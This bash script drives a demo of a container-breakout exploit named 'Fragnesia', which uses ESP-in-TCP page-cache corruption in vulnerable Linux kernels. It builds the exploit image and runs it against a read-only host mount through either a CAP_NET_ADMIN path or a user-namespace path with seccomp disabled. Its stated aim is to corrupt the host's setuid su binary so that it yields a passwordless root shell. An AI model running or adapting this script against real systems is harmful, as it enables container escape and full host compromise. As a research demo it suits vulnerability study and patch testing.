#!/bin/bash
# Fragnesia container breakout -- Docker demo
#
# Demonstrates ESP-in-TCP page-cache corruption using Docker with
# a read-only host filesystem bind mount.
#
# Prerequisites:
#   - Vulnerable kernel (v5.18 -- v7.1-rc7)
#   - Docker with default seccomp profile
#   - Host must have a setuid-root binary (e.g., /usr/bin/su)
#
# Usage:
#   ./docker-test.sh          # build + run the exploit
#   ./docker-test.sh verify   # check if corruption succeeded

set -euo pipefail

CONTAINER_NAME="fragnesia-breakout"
IMAGE_NAME="fragnesia:latest"

build_image() {
    echo "[*] building exploit container image..."
    docker build -t "$IMAGE_NAME" -f Dockerfile .
}

run_exploit() {
    local mode="${1:-netadmin}"
    echo "[*] starting container with read-only host mount..."
    docker rm -f "$CONTAINER_NAME" 2>/dev/null || true

    case "$mode" in
        netadmin)
            # Path 1: CAP_NET_ADMIN (works with default seccomp)
            # Simulates Istio sidecar, CNI agent, network monitoring pod
            echo "[*] using CAP_NET_ADMIN path (default seccomp)"
            docker run --rm --name "$CONTAINER_NAME" \
                --user 0:0 \
                --cap-add NET_ADMIN \
                -v /:/hostfs:ro \
                "$IMAGE_NAME" \
                --hostfs /hostfs
            ;;
        userns)
            # Path 2: Unprivileged user namespace (needs seccomp=unconfined)
            # Simulates monitoring agent on pre-1.27 K8s cluster
            echo "[*] using user namespace path (seccomp=unconfined)"
            docker run --rm --name "$CONTAINER_NAME" \
                --user 1000:1000 \
                --security-opt seccomp=unconfined \
                -v /:/hostfs:ro \
                "$IMAGE_NAME" \
                --hostfs /hostfs
            ;;
    esac

    echo ""
    echo "[*] container exited. test on the host:"
    echo "    /usr/bin/su"
    echo ""
    echo "[*] if the exploit succeeded, su will drop you to a root shell"
    echo "    without asking for a password (shellcode runs instead)."
    echo ""
    echo "[*] NOTE: to restore the binary:"
    echo "    apt-get install --reinstall util-linux"
}

verify_only() {
    echo "[*] verifying page-cache corruption..."
    docker run --rm \
        --user 1000:1000 \
        -v /:/hostfs:ro \
        "$IMAGE_NAME" \
        --verify /hostfs/usr/bin/su
}

case "${1:-run}" in
    build)    build_image ;;
    run)      build_image; run_exploit "${2:-netadmin}" ;;
    verify)   verify_only ;;
    *)        echo "Usage: $0 [build|run|verify] [netadmin|userns]"; exit 1 ;;
esac
